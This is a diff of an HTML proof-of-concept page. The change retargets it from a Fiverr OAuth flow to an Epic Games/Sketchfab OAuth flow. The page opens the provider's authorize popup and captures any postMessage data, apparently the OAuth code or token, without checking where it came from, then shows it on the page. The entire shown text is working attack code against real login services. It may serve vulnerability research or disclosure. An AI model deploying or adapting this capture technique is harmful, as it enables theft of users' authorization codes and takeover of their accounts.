@@ -7,7 +7,7 @@
         <script type="text/javascript">
         window.addEventListener("load", () => {
             document.getElementById("startBtn").addEventListener("click", () => {
-                var x = window.open('https://accounts.fiverr.com/oauth2/authorize?client_id=1e353bd4bb26267118819a929020ca76&response_type=code&redirect_uri=https%3A%2F%2Fapp.workspace.fiverr.com%2Foauth%2Ffiverr&scope=openid+profile+email&state=d2e9136017f8-4eb6-8b4b-6b50e06d2f96&identity=1', 'mywindow');
+                var x = window.open('https://epicgames.com/id/authorize?client_id=xyza7891aaoJHOSQ1y2hGW378ogqtftm&redirect_uri=https%3A%2F%2Fsketchfab.com%2Fsocial%2Fcomplete%2Fepic%2F%3Fredirect_state%3DFqLcz0FpqiQ7GlyQOGNbdAONHFUVs3ah&state=FqLcz0FpqiQ7GlyQOGNbdAONHFUVs3ah&response_type=code&scope=basic_profile+email', 'mywindow');
                 window.onmessage = (e) => {
                     document.getElementById("token-plate").innerText = JSON.stringify(e.data);
                 }
